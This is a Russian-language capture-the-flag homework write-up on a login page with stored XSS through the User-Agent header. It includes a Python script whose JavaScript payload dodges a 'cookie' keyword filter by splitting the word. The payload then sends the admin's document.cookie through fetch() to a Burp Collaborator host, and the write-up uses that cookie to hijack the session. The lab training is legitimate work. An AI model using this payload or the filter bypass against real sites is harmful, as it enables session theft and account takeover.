# Forbidden_Code_HW

## Разведка на предмет XSS
При входе на сайт видем форму входа, а так же возможность зарегестрироваться. Создаём аккаунт с произвольными паролем и логином

![](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/c6f1688f-21af-417f-84f7-aa1078916318)

На странице аккаунта можно увидеть, что ведётся логирование неудачных попыток входа в профиль. Попробуем проверить сайт на наличие XSS уязвимости, путём
указания в качестве User-Agent пейлоад `<script>alert(0)</script>`

![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/c5f378e0-f722-4deb-9907-7c0f36b820c5)

Уязвимость XSS действительно присутствует, получаем результат:

![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/545f0980-f419-4afd-a1ba-bf77c1ee4f29)

## Эксплуатация XSS уязвимости с помощью BurpSuite инструмента Collaborator

Для кражи файлов cookie, необходимо украсть значение `document.cookie`. При попытке вывести значение напрямую с помощью `alert(document.cookie)` сталкиваемся с тем,
что на сервере установлена фильтрация на слово 'cookie'

![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/8d25f0a8-4bc8-4879-808d-7256e03fc6b4)

Обходим фильтрацию путём разбиения слова cookie на две части одного массива. А так же поднимаем сервер с помощью инструмента collaborator в Burpsuite

![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/96e0ed20-05a1-4030-97c7-8948a6186961)

Скрипт для отправки запроса на python.
```python
import requests

payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://urp3un99hbcf34xlr31cxw4h78dz1qpf.oastify.com/?${vv}=` + document[vv]; fetch(payload);</script>'
#vv - массив, состоящий из элементов "coo" и "kie" для обхода фильтрации
user = "admin" # ставим admin так как именно его cookie крадём
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
 
print(response.status_code)
```
После отправки запроса переходим в BurpSuite, видим сохранённые cookie админ-сессии

![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/2536c715-2e4a-4784-8a96-a4b252c8f421)

Подставляем их в качестве своих значений:

![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/213e2ab8-c41e-4549-b6fd-8bc404e7da9c)

Результат:

![изображение](https://github.com/Ezhidze25/Forbidden_Code_HW/assets/57564074/7e7b4c4c-642e-423d-9c5f-a7f1f5c5837f)

Получаем флаг: ***CODEBY{m1ss_th3_cl13nt_att4cks?}***
